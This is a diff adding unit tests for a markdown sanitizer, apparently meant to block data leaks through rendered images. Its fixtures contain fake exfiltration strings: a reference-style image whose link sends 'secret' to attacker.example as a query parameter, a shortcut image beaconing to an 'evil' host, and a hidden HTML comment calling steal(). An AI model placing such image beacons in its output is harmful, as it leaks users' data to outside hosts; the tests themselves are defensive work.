@@ -13,6 +13,27 @@ def test_image_url_defanged():
     assert "image removed" in out
 
 
+def test_reference_style_image_defanged():
+    out = sanitize_markdown(
+        "![leak][r]\n\n[r]: http://attacker.example/?d=secret"
+    )
+    assert "attacker.example" not in out
+    assert "image removed" in out
+    assert "(link removed)" in out
+
+
+def test_shortcut_image_defanged():
+    out = sanitize_markdown("see ![beacon] here\n[beacon]: http://evil/x")
+    assert "http://evil" not in out
+    assert "image removed" in out
+
+
+def test_multiline_html_comment_stripped():
+    out = sanitize_markdown("a\n<!--\nhidden steal()\n-->\nb")
+    assert "hidden" not in out
+    assert "steal" not in out
+
+
 def test_https_link_kept():
     out = sanitize_markdown("[docs](https://example.com/page)")
     assert "https://example.com/page" in out
